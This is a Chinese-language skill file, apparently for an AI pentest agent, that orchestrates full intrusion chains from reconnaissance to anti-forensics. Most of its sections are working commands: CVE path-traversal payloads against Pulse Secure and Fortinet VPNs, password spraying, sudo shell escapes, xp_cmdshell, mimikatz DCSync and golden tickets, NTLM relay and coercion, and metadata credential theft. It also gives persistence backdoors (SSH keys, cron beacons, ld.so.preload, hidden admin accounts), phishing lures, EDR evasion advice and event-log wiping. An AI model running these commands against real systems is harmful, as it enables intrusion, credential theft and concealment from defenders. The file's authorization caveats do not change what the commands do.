# Attack Chain Orchestration Skill

> 多阶段攻击路径规划与执行的总指挥。当任务需要"从 A 打到 B"的完整链路时，本 Skill 负责编排各阶段、协调子 Skill、规划攻击路径。
> 不是"红队专属"——任何需要跨阶段组合的渗透场景都从这里开始。

---

## 何时路由到本 Skill

以下场景**必须**先经过本 Skill 做全链路规划，再分发到具体子 Skill 执行：

| 场景 | 为什么需要编排 |
|------|--------------|
| "帮我做一次完整的渗透测试" | 需要规划从信息收集到报告的全流程 |
| "从外网打到域控" | 跨越边界突破→提权→横向→AD 多个阶段 |
| "HW 攻防演练" | 需要完整攻击链 + 隐蔽性 + 痕迹清理 |
| "评估这个目标的攻击面" | 需要多维度信息收集 + 路径规划 |
| "我拿到了一个 webshell，下一步怎么办" | 需要从当前据点规划后续路径 |
| "帮我规划攻击路径" | 明确需要路径编排 |
| "从这个漏洞能打到什么程度" | 需要评估漏洞的链式利用价值 |
| "Bug Bounty 持续监控" | 需要自动化多阶段流程 |
| "内网渗透全流程" | 横向移动 + 提权 + 域攻击组合 |
| "近源渗透方案" | 物理接入 + 内网渗透组合 |
| "供应链攻击路径" | 跨组织多跳攻击 |
| "钓鱼 + 后渗透" | 初始访问 + 后续利用组合 |

**单阶段任务不需要经过本 Skill**：
- 只做端口扫描 → 直接去 `pentest-tools/`
- 只做 SQL 注入 → 直接去 `pentest-tools/`
- 只做 APK 逆向 → 直接去 `apk-reverse/`
- 只做域渗透 → 直接去 `pentest-tools/references/network-attack-defense.md`

---

## 编排原则

### 本 Skill 的角色

```
用户提出多阶段任务
    ↓
attack-chain/SKILL.md（本文件）
    ↓ 规划攻击路径、确定阶段顺序
    ↓ 评估每阶段所需工具和方法
    ↓
分发到具体子 Skill 执行：
    ├── pentest-tools/     → 工具调用、漏洞利用
    ├── apk-reverse/       → 移动端渗透
    ├── js-reverse/        → Web 前端突破
    ├── reverse-engineering/ → 二进制分析
    ├── ida-reverse/       → 深度逆向
    └── browser-automation/ → 自动化操作
    ↓
每阶段完成后回到本 Skill 评估下一步
    ↓
全部完成 → docs-generator 生成报告
```

### 路径规划决策树

```
拿到目标后：
1. 目标是什么？（Web/内网/云/移动/IoT）
2. 当前有什么？（外部视角/已有凭据/已有据点）
3. 最终目标是什么？（域控/数据/特定系统/证明影响）
4. 约束条件？（时间/隐蔽性/不可触碰的系统）
    ↓
根据以上信息规划最短路径
    ↓
一条路走不通 → 回到本 Skill 重新规划备选路径
```

---

## 完整攻击链阶段

---

## 〇、资源开发 / Resource Development (TA0042)

> **授权前置**：本阶段所有动作 MUST 列入 SOW (Statement of Work) / 授权书。基础设施获取虽然不直接打目标，但 **属于受授权约束的红队动作**——例如使用攻击者控制的域名/服务器对客户域名做 phishing 演练，主控方需要知情。详见 `RULES.md` Security Boundaries 与 `field-journal/precedent-auth.md`。
>
> **本节为检查清单 + 外链方法论**，不写完整 playbook。原因：（1）该层 tradecraft 时效性强、防御方读得多，低保真内容 6 个月就过期；（2）写出可直接套用的攻击基础设施搭建脚本会越过授权边界。

### 0.1 基础设施获取 / Acquire Infrastructure (T1583)

```text
Pre-engagement 检查清单：
□ 钓鱼/C2 域名注册（T1583.001）
  - 主域名 (registered for >30d)、相似域 (typosquat / IDN homograph)、置换字符域
  - 老化策略：注册后挂普通博客/合法着陆页 ≥ 30 天再用
  - 域名分级：phishing 域 / C2 主域 / 重定向域 / 备用兜底域，互不复用
  - 阻断检测面：域名信誉库（VirusTotal / urlscan / Cisco Umbrella / Fortiguard）
□ VPS / 跳板机 (T1583.004)
  - 区域选择：避开目标本地区域；不复用既有红队 IP 段
  - 控制面：操作机 → SSH bastion → 落地机，三层隔离
  - 协议指纹：默认 SSH/HTTPS 端口；禁默认 banner（OpenSSH 版本号、Cobalt Strike NanoHTTPD 特征）
□ CDN / 域前置 (T1090.004)
  - Cloudflare / Fastly / Azure Front Door 三选一
  - 注意：2024 年后 AWS CloudFront、Azure Front Door 已禁绝大多数 domain fronting，需用 SNI 切分或 Cloudflare Workers 替代
□ 重定向链 (T1090)
  - C2 流量经 Apache mod_rewrite / nginx proxy_pass / Cloudflare Worker 中转
  - 仅对授权目标 IP 段开放，其他来源返回合法落地页
□ 邮件投递基建 (T1583.001 + T1585.002)
  - SPF / DKIM / DMARC 全配通过 mail-tester 100/100
  - 反向 DNS 与 HELO 一致；IP 入主流邮件信誉表 ≥ 7 天
```

### 0.2 基础设施入侵 / Compromise Infrastructure (T1584)

> **红队禁用 — 仅列防御视角**。利用已被攻陷的合法网站/CDN 做跳板属于 APT 常见手法，但 **未经多方授权情况下** 在红队工程里使用会同时违反对目标和对第三方两个授权边界。
>
> 本仓不提供攻击教程；如发现真实样本走 T1584 路径，写到 `malware-analysis/` 下做防御画像即可。

### 0.3 能力开发 / Develop Capabilities (T1587)

```text
□ 载荷开发 (T1587.001)
  - 加载器：自研 shellcode loader（避免公开模板被特征化）
  - 混淆：字符串/控制流混淆 + Reflective DLL / PE
  - 详细指引见 edr-bypass-re/SKILL.md
□ 可塑 C2 profile (T1587.001)
  - Cobalt Strike Malleable C2：HTTP header / URI / Body 全可塑
  - Sliver: implant generation 可指定 protocol/transport
  - 仿冒目标真实存在的 SaaS 通信（Slack webhook 模板、Office365 心跳）
□ 数字证书 (T1587.002 自签 / T1588.003 获取)
  - 仅 **合法获取**：OV/EV 证书购买（用 sock-puppet 公司主体）
  - 自签 + 测试 CA：仅用于内部红队靶场
  - **禁止**：窃取合法主体证书私钥用于真实演练
□ 字典与社工资料 (T1587.001)
  - 目标员工字典：脉脉/LinkedIn 抓取 → 工号/邮箱/姓名规则生成
  - 行业关键词字典：从招聘信息/技术博客中提炼
```

### 0.4 账号准备 / Establish Accounts (T1585)

```text
□ Sock-puppet 社交账号 (T1585.001)
  - LinkedIn / 脉脉 / 微信：≥ 3 个月历史、≥ 50 联系人、≥ 10 条原创帖
  - 头像：StyleGAN 生成 + 反搜（Yandex / Google）确认未在它处出现
  - **禁用**：盗用真实人物身份
□ 邮件账号 (T1585.002)
  - 与 sock-puppet 身份匹配的私域邮箱（Proton/自建 mail server）
  - 不要用 Gmail/QQ 邮箱发钓鱼（信誉低 + 易被识破）
□ 云开发者账号 (T1585.003)
  - 用于 SaaS 钓鱼（OAuth app）、托管 phishing 资产
  - 注册时使用专门的 KYC 资料链
```

### 0.5 与下游 Skill 的协作

| 子动作 | 下游 |
|--------|------|
| 钓鱼载荷构建 | `attack-chain/SKILL.md` §2.3 钓鱼攻击 + `pentest-tools/payloads/` |
| EDR/AV 规避 | `edr-bypass-re/SKILL.md` |
| 供应链入口 (T1195) | `supply-chain-security/SKILL.md`（防御侧） |
| 合法证书与签名 | `pentest-tools/references/network-attack-defense.md` §防御体系建设 |

---

## 一、信息收集阶段 / Reconnaissance (TA0043)

### 1.1 企业数字资产测绘 (T1590, T1595)

> **首选漏斗**：详细 5 阶段 (Subfinder → DNSx → Naabu → HTTPX → Katana) 与 MCP 调用方式见 [`pentest-tools/references/recon-pipeline.md`](../pentest-tools/references/recon-pipeline.md)。下面只保留快速调用片段，**深度执行 MUST 走 recon-pipeline.md** 避免双写漂移。

```bash
# 快速链路（全自动，约 10 分钟出真实 Web 服务列表）
subfinder -d target.com -all -o subs.txt
dnsx -l subs.txt -a -resp -wd target.com -o live.txt
naabu -l live.txt -top-ports 1000 -o ports.txt
httpx -l ports.txt -status-code -title -tech-detect -mc 200,401,403 -json -o webs.json
katana -u <(jq -r '.url' webs.json) -hl -jc -kf all -d 3 -j -o endpoints.json

# 补充：Amass 用于 OSINT 扩展（被动数据源差异）
amass enum -d target.com -passive -o amass.txt
nmap -sV -sC -iL ports.txt -oA nmap_deep   # 重点目标深扫
```

**实战要点**：
- 通过企查查/天眼查获取子公司列表，扩大攻击面
- 关注测试环境（test.、dev.、staging.）和新上线系统
- 证书透明度日志（crt.sh）发现隐藏域名
- 漏斗每阶段输出到独立文件，断点重跑无需从头开始

### 1.2 敏感信息泄露狩猎

```bash
# GitHub 搜索
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# JS 文件中的 API Key
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**高价值目标**：
- 云服务 AK/SK（阿里云、AWS、Azure）
- 数据库连接字符串
- JWT 密钥
- 内部 API 文档
- VPN/堡垒机凭据

### 1.3 员工信息画像

**社工字典生成规则**：
```
{姓名拼音}{年份}       → zhangsan2024
{姓名首字母}{部门缩写}  → zs_dev
{工号}@{域名}          → 10086@target.com
{姓名}{常见后缀}       → zhangsan@123, zhangsan!@#
```

**信息来源**：
- 脉脉/LinkedIn 部门架构
- 企业公众号/官网团队介绍
- 招聘信息（技术栈暴露）
- 学术论文（邮箱暴露）

### 1.4 技术栈指纹识别

```bash
# Web 指纹
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# 特定框架探测
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS 识别
wpscan --url https://target.com --enumerate p,t,u
```

---

## 二、边界突破阶段 / Initial Access (TA0001)

### 2.1 Web 漏洞利用（高频突破点）

| 漏洞类型 | 检测工具 | 利用方式 |
|---------|---------|---------|
| SQL 注入 | sqlmap | 数据提取 → 写 shell → OS 命令 |
| SSTI | sstimap | 模板注入 → RCE |
| 文件上传 | 手工 + Burp | Webshell → 反弹 shell |
| 反序列化 | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | 手工 | 内网探测 → 云元数据 → AK/SK |
| 未授权访问 | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | 管理员会话劫持 |

```bash
# SQL 注入自动化
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI 检测
sstimap -u "https://target.com/search?q=test"

# Nuclei 批量扫描
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 供应链攻击

**攻击路径**：
1. 识别目标使用的第三方组件/服务商
2. 攻击供应商获取代码签名/更新推送权限
3. 通过合法更新通道投递恶意载荷

**常见入口**：
- 开源组件投毒（npm/pip/maven）
- SaaS 服务商 API 滥用
- 外包人员权限利用
- 共享 IT 服务商横向渗透

### 2.3 钓鱼攻击

**邮件钓鱼**：
```
主题模板：
- [紧急] VPN 证书即将过期，请立即更新
- [IT通知] 邮箱存储空间不足，请清理
- [HR] 2024年度绩效考核结果查询
- [财务] 报销系统升级，请重新登录确认
```

**载荷类型**：
- Office 宏文档（.docm/.xlsm）
- LNK 快捷方式（伪装 PDF）
- HTML 走私（HTML Smuggling）
- ISO/IMG 镜像（绕过 MOTW）
- OneNote 嵌入脚本

**OAuth 钓鱼**（2025 新趋势）：
- 构造恶意 OAuth 应用请求权限
- 用户授权后获取邮箱/文件访问权限
- 无需密码，绕过 MFA

### 2.4 近源渗透（Physical Access）

| 手法 | 工具 | 效果 |
|------|------|------|
| BadUSB | Rubber Ducky / WiFi Ducky | 键盘注入 → 反弹 shell |
| 恶意充电宝 | O.MG Cable | 伪装数据线植入后门 |
| WiFi 钓鱼 | Fluxion / WiFi Pineapple | 伪造热点 → 凭据捕获 |
| RFID 克隆 | Proxmark3 | 门禁卡复制 → 物理进入 |
| 网络植入 | Raspberry Pi / LAN Turtle | 内网持久接入点 |

```bash
# Fluxion WiFi 钓鱼
fluxion  # 交互式选择目标 AP → 创建伪造热点 → 捕获 WPA 密码

# BadUSB 联动 Cobalt Strike
# 通过 USB 注入 PowerShell 下载器 → 上线 C2
```

### 2.5 VPN/远程接入突破

```bash
# Pulse Secure VPN（CVE-2019-11510）
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN（CVE-2018-13379）
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# 通用：密码喷洒
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 云服务突破

```bash
# AWS S3 桶枚举
aws s3 ls s3://target-bucket --no-sign-request

# 云元数据 SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD 密码喷洒
# 使用 MSOLSpray / Spray 工具
```

---

## 三、权限提升阶段 / Privilege Escalation (TA0004)

### 3.1 Windows 提权

| 技术 | 条件 | 工具 |
|------|------|------|
| Potato 系列 | SeImpersonate 权限 | SweetPotato / GodPotato / PrintSpoofer |
| 内核漏洞 | 未打补丁 | watson / wesng 检测 |
| 服务路径劫持 | 不带引号的服务路径 | PowerUp |
| DLL 劫持 | 可写 DLL 搜索路径 | Process Monitor |
| AlwaysInstallElevated | 注册表配置 | msiexec 安装恶意 MSI |
| 计划任务 | 可写任务脚本 | schtasks 替换 |

```powershell
# 检测 SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato 提权
.\GodPotato.exe -cmd "cmd /c whoami"

# 自动化检测
.\winPEAS.exe
```

### 3.2 Linux 提权

```bash
# SUID 检测
find / -perm -4000 -type f 2>/dev/null

# sudo 滥用
sudo -l
# 常见可利用：vim, find, python, nmap, less, awk, perl

# sudo vim 提权
sudo vim -c ':!/bin/bash'

# sudo find 提权
sudo find / -exec /bin/bash \;

# 内核漏洞
uname -r  # 检查版本
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# 自动化检测
./linpeas.sh
```

### 3.3 数据库提权

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF 提权
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 云权限提升

```bash
# AWS IAM 枚举
aws iam list-attached-user-policies --user-name compromised-user
# 寻找 iam:PassRole + lambda:CreateFunction → 管理员权限

# Azure AD
# 全局管理员 → 所有订阅控制
# 应用管理员 → 添加凭据到服务主体
```

---

## 四、横向移动阶段 / Lateral Movement (TA0008)

### 4.1 凭据获取 / Credential Access (TA0006)

> 现代凭据获取（AiTM cookie 窃取 / MFA 疲劳 / 浏览器与密码库 / OAuth token / IPv6 中继）详见 [`pentest-tools/references/network-attack-defense.md` §凭证获取](../pentest-tools/references/network-attack-defense.md#凭证获取--credential-access-ta0006)。本节只列经典 AD/本地链路。

```bash
# Mimikatz（Windows）
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux 凭据
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM Hash 提取
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH 横向
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# 金票据
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 隐蔽横向技术

```bash
# WMI 无文件执行
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM 远程执行
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec（会留痕）
psexec.py domain/admin:password@target_ip

# SSH 隧道（Linux 环境）
ssh -D 1080 user@pivot_host  # SOCKS 代理
ssh -L 3389:internal_host:3389 user@pivot_host  # 端口转发
```

### 4.4 NTLM Relay

```bash
# 关闭 Responder 的 SMB/HTTP
# 编辑 Responder.conf: SMB = Off, HTTP = Off

# 启动 Responder 捕获
responder -I eth0

# NTLM Relay 到目标
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer 强制认证
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD 攻击路径

```bash
# BloodHound 数据收集
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# 常见攻击路径：
# 1. 用户 → GenericAll → 目标用户 → 重置密码
# 2. 用户 → WriteDacl → 目标 OU → 添加权限
# 3. 计算机 → 约束委派 → 模拟任意用户
# 4. 用户 → DCSync 权限 → 导出所有 Hash

# Certipy AD CS 攻击
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## 五、权限维持阶段 / Persistence (TA0003)

### 5.1 Windows 持久化

| 技术 | 隐蔽性 | 检测难度 |
|------|:---:|:---:|
| 计划任务 | 中 | 低 |
| 注册表 Run 键 | 低 | 低 |
| WMI 事件订阅 | 高 | 高 |
| DLL 劫持 | 高 | 中 |
| 影子账户 | 中 | 中 |
| Golden Ticket | 极高 | 极高 |
| DSRM 后门 | 极高 | 极高 |

```powershell
# WMI 事件订阅（高隐蔽）
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# 影子账户
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# 修改注册表 F 值克隆 RID
```

### 5.2 Linux 持久化

```bash
# SSH 密钥植入
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab 后门
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD 劫持
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM 后门
# 修改 pam_unix.so 添加万能密码

# Systemd 服务
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 云环境持久化

```bash
# AWS Lambda 后门
# 创建定时触发的 Lambda 函数，回连 C2

# Azure AD 应用注册
# 创建应用 → 添加密钥凭据 → 授予 Graph API 权限

# 容器后门
# 修改基础镜像 → 所有新容器自带后门
```

---

## 六、EDR/AV 绕过 / Defense Evasion (TA0005)

### 6.1 核心绕过思路

| 层面 | 技术 | 说明 |
|------|------|------|
| 静态检测 | 加密/混淆/自定义加载器 | 避免签名匹配 |
| 行为检测 | 间接系统调用/Unhooking | 绕过 API Hook |
| 内存检测 | 模块踩踏/堆加密 | 避免内存扫描 |
| 网络检测 | 域前置/合法服务隧道 | 混入正常流量 |
| 日志检测 | ETW Patching/日志清除 | 减少痕迹 |

### 6.2 实用绕过技术

```
1. Shellcode 加载器自定义（不用公开工具）
2. 系统调用直接调用（绕过 ntdll hook）
3. 进程注入选择低监控进程（如 RuntimeBroker.exe）
4. C2 流量走 HTTPS + 域前置 / Cloudflare Workers
5. 内存中执行，不落盘（Fileless）
6. 利用合法签名程序加载（LOLBins）
```

### 6.3 C2 框架选择

| 框架 | 特点 | 适用场景 |
|------|------|---------|
| Cobalt Strike | 成熟稳定，团队协作 | 大型红队行动 |
| Sliver | 开源，Go 编写 | 预算有限 |
| Havoc | 现代化，模块化 | 需要定制 |
| Mythic | 多 agent 支持 | 跨平台 |
| AdaptixC2 | Kali 2026.1 收录 | 快速部署 |

---

## 六.5 数据采集 / Collection (TA0009)

> 详细技术与防御视角见 [`pentest-tools/references/network-attack-defense.md` §采集 / Collection (TA0009)](../pentest-tools/references/network-attack-defense.md#采集--collection-ta0009)。

落地后从已控终端取出有价值数据：屏幕/键盘/剪贴板、邮件、浏览器与密码库、本地/网络/云存储、SharePoint/Confluence/GitLab、归档与暂存。在 Phase 6 (Defense Evasion) 之后、Phase 6.7 (Exfiltration) 之前执行。

## 六.7 数据外带 / Exfiltration (TA0010)

> 详细技术与防御视角见 [`pentest-tools/references/network-attack-defense.md` §外带 / Exfiltration (TA0010)](../pentest-tools/references/network-attack-defense.md#外带--exfiltration-ta0010)。

把采集到的数据带出目标网络：C2 信道、Web 服务（Telegram/GitHub/Mega/Pastebin）、备用协议（DNS/ICMP）、分块、转存到攻击者云账号。**先于 Phase 7 (Anti-Forensics) 完成**，避免清理后还要再开一条出站路径暴露自己。

---

## 七、痕迹清理 / Anti-Forensics (T1070)

```bash
# Windows 日志清除
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux 日志清除
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# 时间戳修改
touch -t 202301010000 /path/to/file

# 内存清理
# 确保 Mimikatz dump 已删除
# 确保 C2 beacon 已退出
# 确保临时文件已清除
```

---

## 红队行动铁律

### 三条底线

1. **所有操作必须获得书面授权**
2. **数据渗出需进行匿名化处理**
3. **清理所有攻击痕迹（包括内存驻留）**

### 行动纪律

- 每个操作前评估风险等级（低/中/高/严重）
- 高风险操作前通知项目经理
- 保持操作日志（时间、动作、结果）
- 发现高危漏洞立即上报，不扩大利用
- 不影响业务可用性（禁止 DoS）
- 不访问/下载真实用户数据

### 典型失败案例

| 失败原因 | 后果 | 教训 |
|---------|------|------|
| 未清除 Mimikatz 内存 dump | 蓝队溯源完整攻击路径 | 操作后立即清理 |
| C2 域名被威胁情报标记 | 首次连接即被拦截 | 使用新注册域名 + 域前置 |
| 钓鱼邮件触发 DLP 告警 | 蓝队提前预警 | 测试邮件网关规则 |
| 横向移动触发蜜罐 | 暴露攻击意图 | 先识别蜜罐再行动 |

---

## 工具速查表

### 信息收集
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### 漏洞利用
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### 权限提升
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### 横向移动
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 框架
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### 近源渗透
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## 与本包其他 Skill 的关系

| 需求 | 路由到 |
|------|--------|
| Web 漏洞深度利用 | `pentest-tools/SKILL.md` |
| 内网 AD 攻击详细步骤 | `pentest-tools/references/network-attack-defense.md` |
| 逆向分析恶意样本 | `reverse-engineering/SKILL.md` |
| APK 逆向（移动端渗透） | `apk-reverse/SKILL.md` |
| JS 前端签名绕过 | `js-reverse/SKILL.md` |
| 自动化群体渗透 | Pentest Swarm AI（`pentestswarm scan --swarm`） |
| AI 辅助渗透 | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| 报告生成 | `docs-generator/SKILL.md` |
| 攻击路径图 | `diagram-generator/SKILL.md` |
